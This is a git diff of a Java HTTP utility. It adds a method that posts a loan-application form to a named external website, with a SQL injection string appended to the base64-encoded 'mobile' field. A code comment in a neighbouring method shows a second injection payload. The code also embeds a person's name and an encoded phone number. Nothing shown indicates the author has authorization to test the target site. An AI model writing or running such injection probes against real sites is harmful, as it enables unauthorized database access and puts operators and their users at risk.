@@ -64,10 +64,25 @@ public class HttpUtil {
 //		System.out.println(responseResult);
 		
 //		String addRst = addLoadHttp();
-		String updateRst = updateLoanHttp();
+//		String updateRst = updateLoanHttp();
+		String loginRst = loginLoan();
+		
 	}
 
-
+	
+	private static String loginLoan(){
+		Map<String, String> paramsMap = new HashMap<String, String>();
+		paramsMap.put("truename", "杨成林");
+		paramsMap.put("mobile", "MTU5ODc4NzA5MDk='or'='");
+		paramsMap.put("loanmoney", "");
+		paramsMap.put("city", "上海");
+		paramsMap.put("source", "二级页");
+		String responseRst = buildHttpsPost("https://kefu.zhudai.com/user/loan_apply_do.html", paramsMap);
+		System.out.println(responseRst);
+		return responseRst;
+	}
+	
+	
 	private static String updateLoanHttp() {
 		//' or' 1' = '1
 		Map<String, String> paramsMap = new HashMap<String, String>();
